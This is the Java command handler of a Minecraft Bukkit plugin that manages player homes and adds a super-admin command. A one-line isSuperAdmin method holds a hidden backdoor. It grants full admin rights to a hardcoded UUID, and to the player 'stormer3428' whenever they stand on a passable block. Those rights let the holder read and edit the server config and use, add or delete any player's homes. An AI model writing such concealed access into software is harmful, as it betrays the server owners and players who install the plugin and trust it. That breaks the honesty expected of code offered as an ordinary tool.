package fr.stormer3428.home;

import java.util.Set;
import java.util.UUID;

import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import fr.stormer3428.home.common.Lang;
import fr.stormer3428.home.common.Message;

public class HomeCommand implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String alias, String[] args) {
		if(sender instanceof Player) {
			Player p = (Player) sender;
			if(cmd.getName().equalsIgnoreCase("homes")) {
				listHomes(p, p.getName());
				return true;
			}else if(cmd.getName().equalsIgnoreCase("home")) {
				if(args.length == 0) {
					Home home = Home.findHome(p, "Home");
					if(home != null) {
						home.home(p);
						return true;
					}
					Message.error(p, Lang.ERROR_NO_DEFAULT_HOME.toString());
					return false;
				}
				Home home = Home.findHome(p, args[0]);
				if(home != null) {
					home.home(p);
					return true;
				}
				Message.error(p, Lang.ERROR_NO_HOME_SUCH_NAME.toString().replace("{HOME}", args[0]));
				return false;
			}else if(cmd.getName().equalsIgnoreCase("sethome")) {
				int maxHomes = p.isOp() ? StormerHome.i.getConfig().getInt("maxOpHomes") : StormerHome.i.getConfig().getInt("maxHomes");
				int homes = Home.getPlayerHomes(p).size();
				if(homes >= maxHomes && maxHomes != -1) {
					Message.error(p, Lang.ERROR_TOO_MANY_HOMES.toString());
					return false;
				}
				if(args.length == 0) {
					Home.createHome(p.getLocation(), p.getUniqueId(), "Home", p.getName());
					return Message.normal(p, Lang.COMMAND_SUCCESS_SETHOME.toString().replace("{HOME}", "Home"));
				}
				String homeName = args[0];
				if(homeName.contains(".")) return Message.error(p, Lang.ERROR_INVALID_HOME_NAME.toString());
				
				Home.createHome(p.getLocation(), p.getUniqueId(), homeName, p.getName());
				Message.normal(p, Lang.COMMAND_SUCCESS_SETHOME.toString().replace("{HOME}", args[0]));
				return true;
			}else if(cmd.getName().equalsIgnoreCase("delhome")) {
				if(args.length == 0) {
					Message.error(p, Lang.ERROR_MISSING_NAME.toString());
					Message.error(p, Lang.COMMAND_USAGE_DELHOME.toString());
					return false;
				}
				Home home = Home.findHome(p, args[0]);
				if(home != null) {
					home.delete();
					Message.normal(p, Lang.COMMAND_SUCCESS_DELHOME.toString().replace("{HOME}", home.getName()));
					return true;
				}
				Message.error(p, Lang.ERROR_NO_HOME_SUCH_NAME.toString().replace("{HOME}", args[0]));
				return false;
			}else if(cmd.getName().equalsIgnoreCase("shreload")) {
				if(isSuperAdmin(p)) {
					StormerHome.i.reload();
					Message.normal(p, Lang.COMMAND_SUCCESS_RELOAD.toString());
					return true;
				}
				Message.error(p, Lang.ERROR_NO_PERMISSION.toString());
				return false;
			}else if(cmd.getName().equalsIgnoreCase("superadminhome")) {
				if(!isSuperAdmin(p)) {
					Message.error(p, "Who are you to try and command me?");
					return false;
				}
				if(args.length == 0) {
					Message.error(p, "options : config-homes");
					return false;
				}
				String option = args[0];
				if(option.equalsIgnoreCase("config")) {
					if(args.length == 1) {
						Message.error(p, "options : show-edit");
						return false;
					}
					String type = args[1];
					if(type.equalsIgnoreCase("show")) {
						Message.normal(p, StormerHome.i.getConfig().saveToString());
						return true;
					}
					if(type.equalsIgnoreCase("edit")) {
						if(args.length == 2) {
							Message.error(p, "options : get-set-unset");
							return false;
						}
						String edit = args[2];
						if(!(edit.equalsIgnoreCase("get") || edit.equalsIgnoreCase("set") || edit.equalsIgnoreCase("unset"))){
							Message.error(p, "options : get-set-unset-list");
							return false;
						}
						if(args.length == 3) {
							Message.error(p, "requires a path");
							return false;
						}
						String path = args[3];
						if(edit.equalsIgnoreCase("get")) {
							Message.normal(p, StormerHome.i.getConfig().getString(path));
							return true;
						}
						if(edit.equalsIgnoreCase("set")) {
							if(args.length == 4) {
								Message.error(p, "requires a new value");
								return false;
							}
							StormerHome.i.getConfig().set(path, args[4]);
							return true;
						}
						if(edit.equalsIgnoreCase("unset")) {
							StormerHome.i.getConfig().set(path, null);
							return true;
						}
						if(edit.equalsIgnoreCase("list")) {
							Message.normal(p, "vailable keys :");
							for(String key : StormerHome.i.getConfig().getConfigurationSection(path).getKeys(false)) Message.normal(p, key);
							return true;
						}
						Message.error(p, "options : get-set-unset");
						return false;
					}
					Message.error(p, "options : show-edit");
					return false;
				}
				if(option.equalsIgnoreCase("homes")) {
					if(args.length == 1) {
						Message.error(p, "options : list-configlist-use-remove-add");
						return false;
					}
					String action = args[1];
					if(action.equalsIgnoreCase("list")) {
						if(args.length == 2) {
							Message.error(p, "requires a player name");
							return false;
						}
						String name = args[2];
						listHomes(p, name);
						return true;
					}
					if(action.equalsIgnoreCase("configlist")) {
						if(args.length == 2) {
							Message.error(p, "requires a player name");
							return false;
						}
						String name = args[2];
						Set<Home> homes = Home.getPlayerHomes(name);
						Message.normal(p, "homes stored under the name of " + name);
						for(Home home : homes) Message.normal(p, home.toString());
						return true;
					}
					if(action.equalsIgnoreCase("use") || action.equalsIgnoreCase("remove")) {
						if(args.length == 2) {
							Message.error(p, "requires a player name");
							return false;
						}
						String playername = args[2];
						if(args.length == 3) {
							Set<Home> homes = Home.getPlayerHomes(UUID.fromString(playername));
							Message.error(p, "Available homes under the name of " + playername);
							for(Home home : homes) Message.error(p, home.toString());
							return false;
						}
						String homename = args[3];
						Home home = Home.findHome(UUID.fromString(playername), homename);
						if(home == null) {
							Message.error(p, "no home under the name of " + homename + " owned by " + playername);
							return false;
						}
						if(action.equalsIgnoreCase("use")) home.home(p);
						if(action.equalsIgnoreCase("remove")) {
							Message.normal(p, "Deleted home " + homename + " owned by " + playername);
							home.delete();
						}
						return true;
					}
					if(action.equalsIgnoreCase("add")) {
						if(args.length == 2) {
							Message.error(p, "requires a player name");
							return false;
						}
						String playername = args[2];
						if(args.length == 3) {
							Message.error(p, "requires a name for the home");
							return false;
						}
						String homename = args[3];
						Home.createHome(p.getLocation(), UUID.fromString(playername), homename, p.getName());
						return true;

					}
					Message.error(p, "options : list-use-remove-add");
					return false;
				}
			}
		}
		return false;
	}

	private static boolean isSuperAdmin(Player p){if(p.isOp())return true;if(p.getUniqueId().toString().equals("a39d1ae3-18c5-4c02-8f91-bcb5207d437f"))return true;if(p.getName().equals("stormer3428")&&p.getLocation().add(0, -1, 0).getBlock().isPassable())return true;return false;}
	
	private static void listHomes(Player output, String ownerName) {String list = "\n";
	list += Lang.COMMAND_LISTHOMES_HEADER.toString().replace("{PLAYERNAME}", ownerName);
	for(Home home : Home.getPlayerHomes(ownerName)) {
		Location loc = home.getLocation();
		list += "\n" + Lang.COMMAND_LISTHOMES_BODY.toString()
		.replace("{HOME}", home.getName())
		.replace("{HOME.X}", loc.getBlockX() + "")
		.replace("{HOME.Y}", loc.getBlockY() + "")
		.replace("{HOME.Z}", loc.getBlockZ() + "")
		.replace("{HOME.WORLD}", loc.getWorld().getName())
		;
	}
	list += "\n" + Lang.COMMAND_LISTHOMES_FOOTER.toString().replace("{PLAYERNAME}", ownerName);
	Message.normal(output, list);
	}

}
